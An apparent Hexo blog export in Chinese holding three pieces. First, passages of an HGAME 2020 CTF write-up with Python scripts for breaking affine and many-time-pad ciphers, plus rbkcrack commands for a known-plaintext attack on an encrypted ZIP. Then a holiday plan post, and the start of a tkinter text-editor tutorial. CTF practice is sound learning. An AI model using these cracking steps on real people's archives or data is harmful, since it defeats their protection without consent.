flag <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span> <span class="token comment"># python2长整数最后面会有个字符L</span>
flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>根据题目，搜索Affine，可以查到仿射加密。</p>
<p>仿射加密要求这个A必须与MOD互素，其实A是MOD内的一个素数（或者1），然后这个B其实就是一个偏移（当A=1的时候，这个加密就是凯撒加密了），我们只需要枚举A和B，如果A和B仿射加密<code>hgame</code>后是<code>A8I5z</code>那么这对A和B就是正确的，exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>
<span class="token keyword">import</span> gmpy2

TABLE <span class="token operator">=</span> <span class="token string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span>
MOD <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>TABLE<span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">'hgame'</span>
encrypt_flag <span class="token operator">=</span> <span class="token string">'A8I5z'</span>
data <span class="token operator">=</span> <span class="token string">'A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;'</span>

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""加密算法"""</span>
    cipher <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> b <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
        i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            cipher <span class="token operator">+=</span> b
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            ii <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">*</span>i <span class="token operator">+</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> MOD
            cipher <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>ii<span class="token punctuation">]</span>
    <span class="token keyword">return</span> cipher

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""解密数据"""</span>
    <span class="token comment"># 算出a的乘法逆元素a_，解密需要a_</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>MOD<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i<span class="token operator">*</span>A <span class="token operator">%</span> MOD <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            a_ <span class="token operator">=</span> i
            <span class="token keyword">break</span>

    <span class="token comment"># 根据a_解密</span>
    result <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> ch
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            ii <span class="token operator">=</span> a_ <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> MOD
            result <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>ii<span class="token punctuation">]</span>
    <span class="token keyword">return</span> result


<span class="token keyword">def</span> <span class="token function">generate_prime</span><span class="token punctuation">(</span>max_num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""生成max_num以内的素数"""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>max_num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">yield</span> i

<span class="token comment"># 枚举A和B</span>
<span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>MOD<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> a <span class="token keyword">in</span> generate_prime<span class="token punctuation">(</span>MOD<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">==</span> encrypt_flag<span class="token punctuation">:</span>
            <span class="token comment">#print('A=%d, B=%d', a, b)</span>
            ret <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>data<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="not-One-time"><a href="#not-One-time" class="headerlink" title="not_One-time"></a>not_One-time</h3><p>一开始查到many-time-pad，但是以现有的工具都不行，学长说不是这样搞的。。。</p>
<p>然后我在一个many-time-pad的攻击脚本中得到灵感，它是根据语义自己猜出明文或者密钥。</p>
<p>然后我想了下，哪里用自己猜，直接爆破flag不就得了。</p>
<p>异或运算有个特点：<code>A xor B xor B == A</code>，样本数据（就是加密后的数据）是这么来的：<code>明文 xor flag == sample</code></p>
<p>而且明文规定了只有：<code>charset = string.ascii_letters+string.digits</code>，那么只要样本数据和爆破的flag异或，如果结果都是charset范围内的字符证明flag有可能是正确的，只要搜集够多的样本，那么可能的flag就越少。</p>
<p>用到的脚本如下：</p>
<p>收集一条数据用的脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token keyword">import</span> base64

data <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

decode_bytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span> decode_bytes<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用法：<code>nc 47.98.192.231 25001 | python2 get_sample.py &gt;&gt; samples.txt</code></p>
<p>保存数据在samples.txt文件里，运行多次上述命令，大概搜集够50条数据就够了</p>
<p>然后，用这些数据进行爆破的flag的验证：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>
<span class="token keyword">import</span> string
<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue

charset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits <span class="token comment"># 被加密的文本的字符集</span>

<span class="token keyword">def</span> <span class="token function">load_sample</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span> <span class="token keyword">as</span> fd<span class="token punctuation">:</span>
        samples <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> fd<span class="token punctuation">:</span>
            line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
            samples<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> samples

<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">validate</span><span class="token punctuation">(</span>samples<span class="token punctuation">,</span> ch<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""样本数据与flag异或来验证"""</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> samples<span class="token punctuation">:</span>
        ret <span class="token operator">=</span> xor<span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span> 
        <span class="token keyword">if</span> ret <span class="token keyword">not</span> <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>

flag_len <span class="token operator">=</span> <span class="token number">42</span> <span class="token comment"># flag长度是43 最后一个是 &#125;</span>
q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
q<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">'hgame&#123;'</span><span class="token punctuation">)</span>
samples <span class="token operator">=</span> load_sample<span class="token punctuation">(</span><span class="token string">'./samples.txt'</span><span class="token punctuation">)</span> <span class="token comment"># 数据存放在samples.txt文件</span>

<span class="token comment">#print(samples)</span>
<span class="token comment">#assert False</span>

count <span class="token operator">=</span> <span class="token number">1</span>

<span class="token comment"># 爆破flag, 密文要足够多</span>
<span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
    count <span class="token operator">-=</span> <span class="token number">1</span>
    next_index <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>
        <span class="token keyword">if</span> validate<span class="token punctuation">(</span>samples<span class="token punctuation">,</span> ch<span class="token punctuation">,</span> next_index<span class="token punctuation">)</span><span class="token punctuation">:</span>
            new_flag <span class="token operator">=</span> flag <span class="token operator">+</span> ch
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>new_flag<span class="token punctuation">)</span> <span class="token operator">==</span> flag_len<span class="token punctuation">:</span>
                <span class="token keyword">print</span> new_flag <span class="token operator">+</span> <span class="token string">'&#125;'</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token comment">#print('now: %s' % new_flag)</span>
                q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>new_flag<span class="token punctuation">)</span>
                count <span class="token operator">+=</span> <span class="token number">1</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'count: %d'</span> <span class="token operator">%</span> count<span class="token punctuation">)</span> <span class="token comment"># 显示出可能的结果数，如果太多就再多收集点密文</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>一开始把题目看错成Recoder，瞬间懵了，然后才发现其实就是打乱了flag的顺序。</p>
<p>直接上做题过程图（嘻嘻，刚好这题留了图，再也不敢不留图了T_T）</p>
<p><img src="/images/20ebc87d/crypto-4-1.png" alt="1"></p>
<hr>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><p>百度发现要base64解码，解码后是摩斯电码：</p>
<p><code>.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</code></p>
<p>然后去找个摩斯电码在线解密的网站解密即可，要注意的是我找到的大部分网站的摩斯电码的分隔符都是<code>/</code>，而这里是空格，所以我还把全部空格换成了<code>/</code>才成功解密</p>
<h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>压缩包解压后是张图片，kali上用binwalk查看发现图片里隐藏了压缩包，且提示解压密码是图片ID：</p>
<p><img src="/images/20ebc87d/misc-2-1.png" alt="1"></p>
<p>分离出压缩包：</p>
<p><img src="/images/20ebc87d/misc-2-2.png" alt="2"></p>
<p>解压压缩包，密码是图片ID，这个ID是P站上的对应的这张图的ID（我一个不懂二次元的硬生生从百度识图一直挖到P站，虽然我也不怎么懂这个P站是什么东东，只是听说过），解压后获得一个flag.txt文件：</p>
<p><img src="/images/20ebc87d/misc-2-3.png" alt="3"></p>
<p>看样子是unicode编码，其实直接当16进制编码处理就好了，python处理一下就好：</p>
<p><img src="/images/20ebc87d/misc-2-4.png" alt="4"></p>
<hr>
<h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>解压压缩包后，有文本文件Bacon.txt和压缩包Novel.zip，压缩包有密码。然后这个压缩包里面也有一个文本文件叫Bacon.txt，把Bacon.txt这个文本文件单独压缩，发现校验码和Novel.zip里的Bacon.txt文件的一样，那么可以确定是一样的文件，查资料发现可以使用明文攻击，可以爆破出加密密钥（不是密码）。</p>
<p>可以用<a href="https://github.com/Aloxaf/rbkcrack">rbkcrack</a>工具来破解，安装我就不细说了，直接破解：</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">rbkcrack<span class="token punctuation">.</span>exe <span class="token operator">-</span>C Novel<span class="token punctuation">.</span>zip <span class="token operator">-</span>c Bacon<span class="token punctuation">.</span>txt <span class="token operator">-</span>p Bacon<span class="token punctuation">.</span>txt <span class="token operator">-</span>P Bacon<span class="token punctuation">.</span>zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中<code>-C Novel.zip</code>是要破解的压缩包，<code>-c Bacon.txt</code>是Novel.zip里面的已知的那个文件的路径，<code>-p Bacon.txt</code>是已知的明文文件，<code>-P Bacon.zip</code>是已知的Bacon.txt压缩后的zip文件</p>
<p><img src="/images/20ebc87d/misc-3-1.png" alt="1"></p>
<p>得到密钥，flag肯定在压缩包里的那个.doc文件里啦，解密出来</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">rbkcrack<span class="token punctuation">.</span>exe <span class="token operator">-</span>C Novel<span class="token punctuation">.</span>zip <span class="token operator">-</span>c <span class="token string">'The Call of Cthulhu.doc'</span> <span class="token operator">-</span>k 720b7516 d2d6a716 2c24dcae  <span class="token operator">-</span>u <span class="token operator">-</span>d xx<span class="token punctuation">.</span>doc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>发现.doc文件打开需要密码，那么密码是从Bacon.txt里解到的（其实我是先解出了.doc文件的密码，才来破解压缩包的），无意间翻译了Bacon这个单词，发现有”培根“的意思，而且还查到了培根密码，然后Bacon.txt里的内容是这样的：</p>
<p><img src="/images/20ebc87d/misc-3-2.png" alt="2"></p>
<p>一些是大写，一些是小写，大写字母当作a，小写字母当作b，空格标点去掉，那么得到培根密码：</p>
<p><img src="/images/20ebc87d/misc-3-3.png" alt="3"></p>
<p>拿去找在先网站解密：</p>
<p><img src="/images/20ebc87d/misc-3-4.png" alt="4"></p>
<p>然后根据提示，大写的那一串就是.doc文件的密码，打开后只是一篇文章，flag隐藏在.doc文件里，打开word文档隐藏字体的显示选项即可。大概方式依次点击：<code>文件-&gt;选项-&gt;显示-&gt;隐藏文字</code></p>
<p><img src="/images/20ebc87d/misc-3-5.png" alt="5"></p>
<p>flag在文档最底部：</p>
<p><img src="/images/20ebc87d/misc-3-6.png" alt="6"></p>
<hr>
<h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p>根据提示</p>
<p><img src="/images/20ebc87d/misc-4-1.png" alt="1"></p>
<p>把前三行文字，找个网站用栅栏密码解密，每组数字为3</p>
<p><img src="/images/20ebc87d/misc-4-2.png" alt="2"></p>
<p>然后凯撒密码解密，偏移为5</p>
<p><img src="/images/20ebc87d/misc-4-3.png" alt="3"></p>
<p>得到压缩包的解密密码，解压后获得一个文本文件：</p>
<p><img src="/images/20ebc87d/misc-4-4.png" alt="4"></p>
<p>复制了两行去搜索，发现是Brainfuck/Ook!编码，又找了个在线网站去解：</p>
<p><img src="/images/20ebc87d/misc-4-5.png" alt="5"></p>
<p>看来是base32编码，解码！</p>
<p><img src="/images/20ebc87d/misc-4-6.png" alt="6"></p>
<p>解码后，最后面有两个等号，看起来是base64编码（一开始用base32继续解码发现不行），然后去base64解码，发现大多网站不是说字符过多，就是直接解不出来，然后用python解</p>
<p><img src="/images/20ebc87d/misc-4-7.png" alt="7"></p>
<p>截取前50个字节看看，发现有PNG头，那么这些数据就是一个PNG图像文件的数据，那么保存到一个.png文件，打开发现是个二维码</p>
<p><img src="/images/20ebc87d/misc-4-8.png" alt="8"></p>
<p>扫码得flag哟！</p>
<hr>
<h3 id="每日推荐"><a href="#每日推荐" class="headerlink" title="每日推荐"></a>每日推荐</h3><p>一个.pcapng文件，用wireshark分析，发现有很多http的包，那就筛选http的包出来</p>
<p><img src="/images/20ebc87d/misc-5-1.png" alt="1"></p>
<p>逐个查看，发现有一个http的请求，上传了一个压缩包</p>
<p><img src="/images/20ebc87d/misc-5-2.png" alt="2"></p>
<p>导出这个压缩包，保存为song.zip：</p>
<p><img src="/images/20ebc87d/misc-5-3.png" alt="3"></p>
<p>压缩包是有密码保护的，用二进制编辑器打开可发现末尾有提示</p>
<p><img src="/images/20ebc87d/misc-5-4.png" alt="4"></p>
<p>密码是6位数字，那直接爆破好了，用什么软件就不细说了，爆破后解压到一个MP3文件（这首歌很好听！）</p>
<p>用Audacity软件打开查看频谱图可得flag</p>
<p><img src="/images/20ebc87d/misc-5-5.png" alt="5"></p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一周艰难的把题目都做了</p>
<ul>
<li><p>web的cxk游戏很好玩！</p>
</li>
<li><p>re看汇编和反汇编很头疼</p>
</li>
<li><p>Pwn乍一眼一看，想复杂了</p>
</li>
<li><p>Crypto学了不少东西（虽然不怎么懂）</p>
</li>
<li><p>misc脑洞真大！！！</p>
</li>
</ul>
<blockquote>
<p>”不问出题人不知道，一问就知道自己的问题有多弱智“</p>
</blockquote>
]]></content>
      <categories>
        <category>hgame-2020</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年寒假计划</title>
    <url>/7de72646/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><img src="/images/7de72646/excerpt.png" alt=""></p>
<span id="more"></span>

<hr>
<h3 id="寒假想要完成的事情"><a href="#寒假想要完成的事情" class="headerlink" title="寒假想要完成的事情"></a>寒假想要完成的事情</h3><p>作为一个大学生，寒假有几乎40天(上一次这么长的寒假应该是小学的时候)。<br>有很多想要做的事情，在这里立个(看样子不只一个)flag(s)。</p>
<h4 id="吉他"><a href="#吉他" class="headerlink" title="吉他"></a>吉他</h4><p>吉他学了有几个月了，一直没什么长进，还是渣渣水平。寒假该好好学。</p>
<p>立flags：</p>
<ol>
<li><strong>至少学习一首指弹曲，一首弹唱曲</strong></li>
<li><strong>学习十个指弹技巧(基本能弹出来)</strong></li>
<li><strong>学学基本乐理</strong></li>
</ol>
<h4 id="计算机技能"><a href="#计算机技能" class="headerlink" title="计算机技能"></a>计算机技能</h4><p>大一上学期没学什么计算机知识，忙着应付学业了(高数不能挂，太丢人了)，趁着寒假好好学习一波。</p>
<p>立flags: </p>
<ol>
<li><strong>学习使用gdb,pwndbg</strong></li>
<li><strong>重学c++</strong></li>
<li><strong>完成keys的开发(自己做的一个密码管理的”软件”)</strong></li>
</ol>
<h4 id="学业"><a href="#学业" class="headerlink" title="学业"></a>学业</h4><p>呃，这个，之前没有考虑到跟不上高数老师的讲课进度，而且忘了给自己留条后路(指自学)，导致应付高数考试手忙脚乱。在寒假先自己好好自学下下学期的内容。</p>
<p>立个flag: <strong>自学高数下册的书本</strong>(虽然只教两章，但不知道哪两章，尽量全部都学)</p>
<h4 id="不要忘了好好玩耍"><a href="#不要忘了好好玩耍" class="headerlink" title="不要忘了好好玩耍"></a>不要忘了好好玩耍</h4><p>不管有多忙，也要记得好好玩耍。</p>
<p>立个flag：<strong>多去打球(羽毛球，篮球都可)</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所立的flags:</p>
<ul>
<li>吉他<ol>
<li><strong>至少学习一首指弹曲，一首弹唱曲</strong></li>
<li><strong>学习十个指弹技巧(基本能弹出来)</strong></li>
<li><strong>学学基本乐理</strong></li>
</ol>
</li>
<li>计算机技能<ol>
<li><strong>学习使用gdb,pwndbg</strong></li>
<li><strong>重学c++</strong></li>
<li><strong>完成keys的开发(自己做的一个密码管理的”软件”)</strong></li>
</ol>
</li>
<li>学业<ol>
<li><strong>自学高数下册的书本</strong></li>
</ol>
</li>
<li>玩耍/运动<ol>
<li><strong>多去打球(羽毛球，篮球都可)</strong></li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>计划清单</category>
      </categories>
      <tags>
        <tag>立flags</tag>
      </tags>
  </entry>
  <entry>
    <title>python小项目之文本编辑器</title>
    <url>/a5aecc96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>高考完后这么就才想起这系列教程，实在抱歉，现在该来继续教程了。<br>本节利用前面所学知识，来完成一个小工具——文本编辑器！</p>
<span id="more"></span>

<h3 id="tkinter"><a href="#tkinter" class="headerlink" title="tkinter"></a>tkinter</h3><p>在实现文本编辑器之前，先来了解下tkinter这个python库。</p>
<p>tkinter库用来实现GUI程序（<em>Graphical User Interface</em> 图形用户界面），我们实现的文本编辑器是有图形的，类似windows系统下的记事本。</p>
<p>当然啦，写GUI程序不只有tkinter库，还有更为强大的pyqt、wxpython等，不过对于本节实现编辑器来说，简单的tkinter库就已经足够了，而且windows安装的python一般自带了这个库，不必另外安装。</p>
<h3 id="实现文本编辑器"><a href="#实现文本编辑器" class="headerlink" title="实现文本编辑器"></a>实现文本编辑器</h3><h4 id="第一步——界面"><a href="#第一步——界面" class="headerlink" title="第一步——界面"></a>第一步——界面</h4><p>首先，我们先把编辑器的图形界面写好。</p>
<p>什么？还没说tkinter库怎么用就开工了？<code>@_@</code></p>
<p>别慌！很简单，看下面代码，相信注释很清楚了：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter
<span class="token comment"># 导入tkinter库</span>


win <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建窗口</span>
win<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'文本编辑器'</span><span class="token punctuation">)</span>  <span class="token comment"># 设置标题</span>

entry_file <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>win<span class="token punctuation">)</span>  <span class="token comment"># 创建一个文本输入框，用来设置文件路径</span>
entry_file<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 放置该输入框</span>

<span class="token keyword">def</span> <span class="token function">do_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 打开文件</span>
    <span class="token keyword">pass</span>
<span class="token keyword">def</span> <span class="token function">do_save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 保存文件</span>
    <span class="token keyword">pass</span>

btn_open <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>win<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'打开'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>do_open<span class="token punctuation">)</span>  <span class="token comment"># 创建按钮用于打开文件</span>
btn_save <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>win<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'保存'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>do_save<span class="token punctuation">)</span>  <span class="token comment"># 创建按钮用于保存文件</span>

<span class="token comment"># 放置按钮</span>
btn_open<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>
btn_save<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token comment"># 创建多行文本框，用于编辑文件</span>
text <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Text<span class="token punctuation">(</span>win<span class="token punctuation">)</span>
text<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span> 

win<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 进入消息循环</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用tkinter创建GUI程序，一般有以下框架：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">win <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建窗口</span>

<span class="token comment"># 界面的布局，如添加按钮、文本框等等</span>

win<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 进入消息循环</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在不必理解这个框架，我们就照着写就好了。</p>
<p>现在对其中的一些地方做下解释，一般创建控件（按钮，文本框等称为控件）的第一个参数为所在的容器，我们的程序里的控件都在主窗口里，也就是<code>win</code>对象。</p>
<p>我们首先创建了一个文本输入框，用来设置要操作文件的路径。</p>
<p>创建按钮可以使用关键字参数<code>text</code>来设置按钮的标签（显示的文字），用关键字参数<code>command</code>来设置点击按钮所做的事，我们分别创建了两个按钮，一个用来打开文件，一个用来保存文件。</p>
<p>最后创建了一个多行文本框，用于文件的编辑。</p>
<p>运行程序，窗口<em>大致</em>如下：<br><img src="/images/a5aecc96/1.png" alt="文本编辑器界面"></p>
<p>大家的界面的样式可能有点不一样，这个因操作系统环境而异<br>（本人比较懒，因为本节重点不是图形界面，所以没有去规划界面的布局，仅仅把控件直接随意放置，如有兴趣，可以自己搜索tkinter的具体用法，画一个比这个好看得多的界面<code>^_^</code>）</p>
<h4 id="第二步——打开文件"><a href="#第二步——打开文件" class="headerlink" title="第二步——打开文件"></a>第二步——打开文件</h4><p>现在我们来实现打开文件这个功能，还记得前面有一句这样的代码吗?</p>
